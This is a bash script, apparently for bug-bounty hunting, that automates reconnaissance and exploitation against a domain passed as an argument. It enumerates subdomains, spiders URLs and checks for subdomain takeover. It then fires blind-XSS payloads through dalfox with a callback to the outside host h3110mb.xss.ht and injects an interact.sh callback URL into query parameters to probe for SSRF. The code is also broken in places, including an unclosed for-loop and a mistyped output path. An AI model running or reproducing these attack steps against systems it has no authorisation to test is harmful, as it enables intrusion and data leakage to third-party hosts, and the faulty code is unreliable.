#!/bin/bash

#Make directory
mkdir -p $1/{recon,nuclei,screenshot,subtko,exploit}
echo
echo
echo "Finding subdomain"
break="================================="
echo
subfinder -d $1 >>  $1/recon/subs.txt
findomain -t $1 -q  >>  $1/recon/subs.txt
assetfinder -subs-only $1 >> $1/recon/subs.txt
gau --subs $1 >> $1/recon/subs.txt
amass enum -d $1 >> $1/recon/subs.txt
echo
echo
echo "Sorting subdomains"
echo $break
echo 
cat $1/recon/subs.txt | sort -u | uniq | tee $1/recon/final_subs.txt
cat $1/recon/final_subs.txt | awk -F// '{print $2}' | tee $1/recon/nmap.txt
echo "Finding live subdomains"
echo $break
echo
cat $1/recon/final_subs.txt | httpx >> $1/recon/live_subs.txt
for domain in $(cat $1/recon/live_subs.txt); do wget $domain/robots.txt > $1/recon/$domain.txt



echo
echo "Taking screenshots"
echo $break
echo
python3 /root/tools/EyeWitness/Python/EyeWitness.py -f $1/recon/live_subs.txt --web --no-prompt -d $1/screenshot/
echo
echo
echo
echo "SPidering host"
echo $break
waybackurls $1 | tee $1/recon/waybackurls.txt
for domain in $(cat $1/recon/live_subs.txt); do gospider -s $domain -p http://127.0.0.1:8080 -c 3 -d 1 -a; done | tee $1/recon/waybackurls.txt
gospider -S $1/recon/live_subs.txt -p http://127.0.0.1:8080 -c 3 -d 1 -a | tee $1/recon/waybackurls.txt
echo
echo " Searching subdomain takeover"
echo $break
python3 /root/tools/takeover/takeover.py -l $1/recon/live_subs.txt -o $1/subtko/output.txt

echo "Exploitation using dalfox"
cat $1/recon/waybackurls.txt | grep "=" | dalfox pipe -b h3110mb.xss.ht | tee $1/exploit/dalfox.txt
assetfinder $1 | gau |  dalfox pipe -b h3110mb.xss.ht >> $1/exploit/dalfox/txt
cat $1/exploit/dalfox/txt | awk '{print $2}' | tee $1/exploit/poc.txt
echo
echo
echo "Exploiting ssrf"
echo
cat $1/recon/waybackurls.txt | gau | grep "="| qsreplace http://cbn1r8s2vtc0000g22e0gf4ohrwyyyyyb.interact.sh | tee $1/exploit/ssrf.txt
echo 
echo "Fetching js endpoint"
cat $1/recon/live_subs.txt | subjs | tee $1/recon/js.txt
echo









